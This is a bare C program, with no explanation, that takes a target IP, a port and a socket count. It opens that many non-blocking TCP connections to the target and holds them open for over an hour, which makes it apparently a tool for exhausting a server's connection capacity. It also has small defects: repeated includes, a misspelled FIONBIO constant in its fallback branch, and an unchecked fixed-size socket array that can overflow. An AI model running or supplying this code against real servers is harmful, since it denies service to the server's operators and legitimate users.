#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <arpa/inet.h>
#include <stdarg.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <dirent.h>
#include <time.h>
#include <sys/stat.h>
#include <sys/file.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/resource.h>

int b_setNonblocking(int fd) {

    int flags;
#if defined(O_NONBLOCK)
    if (-1 == (flags = fcntl(fd, F_GETFL, 0)))
        flags = 0;
    return fcntl(fd, F_SETFL, flags | O_NONBLOCK);
#else
    flags = 1;
    return ioctl(fd, FIOBIO, &flags);
#endif
}



int main(int argc, char **argv){

	int s[5000];
	int i;
	struct sockaddr_in a;

	if(argc!=4){
	    printf("Usage: %s <ip> <port> <sockets>\n",argv[0]);
	    return 1;
	}
	a.sin_addr.s_addr=inet_addr(argv[1]);
	a.sin_family=AF_INET;
	a.sin_port=htons(atoi(argv[2]));

	for (i=0;i<atoi(argv[3]);i++) {
		s[i]=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
		b_setNonblocking(s[i]);
		connect(s[i],(struct sockaddr *)&a,sizeof(struct sockaddr_in));
	}
	sleep(5000);
}

